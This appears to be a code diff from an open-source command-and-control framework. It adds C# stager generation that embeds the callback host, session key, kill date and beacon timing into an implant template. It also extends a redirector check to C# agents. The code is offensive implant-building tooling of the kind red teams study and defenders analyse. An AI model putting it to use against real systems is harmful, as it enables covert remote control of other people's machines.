@@ -338,6 +338,34 @@ class Listener(object):
                 else:
                     return launcherBase
 
+            if language.startswith("csh"):
+                workingHours = listenerOptions['WorkingHours']['Value']
+                killDate = listenerOptions['KillDate']['Value']
+                customHeaders = profile.split('|')[2:]
+                delay = listenerOptions['DefaultDelay']['Value']
+                jitter = listenerOptions['DefaultJitter']['Value']
+                lostLimit = listenerOptions['DefaultLostLimit']['Value']
+
+                with open(self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb") as f:
+                    stager_yaml = f.read()
+                stager_yaml = stager_yaml.decode("UTF-8")
+                stager_yaml = stager_yaml \
+                    .replace("{{ REPLACE_ADDRESS }}", host) \
+                    .replace("{{ REPLACE_SESSIONKEY }}", stagingKey) \
+                    .replace("{{ REPLACE_PROFILE }}", profile) \
+                    .replace("{{ REPLACE_WORKINGHOURS }}", workingHours) \
+                    .replace("{{ REPLACE_KILLDATE }}", killDate) \
+                    .replace("{{ REPLACE_DELAY }}", str(delay)) \
+                    .replace("{{ REPLACE_JITTER }}", str(jitter)) \
+                    .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
+
+                compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+                if not compiler.status == 'ON':
+                    print(helpers.color('[!] csharpserver plugin not running'))
+                else:
+                    file_name = compiler.do_send_stager(stager_yaml, "Sharpire")
+                    return file_name
+
             else:
                 print(helpers.color(
                     "[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."))
@@ -539,6 +567,10 @@ class Listener(object):
                 code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
 
             return code
+        elif language == "csharp":
+            # currently the agent is stageless so do nothing
+            code = ""
+            return code
         else:
             print(helpers.color(
                 "[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
@@ -736,7 +768,7 @@ def send_message(packets=None):
 
             if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:
 
-                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):
+                if self.mainMenu.agents.get_language_db(sessionID).startswith("po") or self.mainMenu.agents.get_language_db(sessionID).startswith("csh"):
                     # logic for powershell agents
                     script = """
         function Invoke-Redirector {
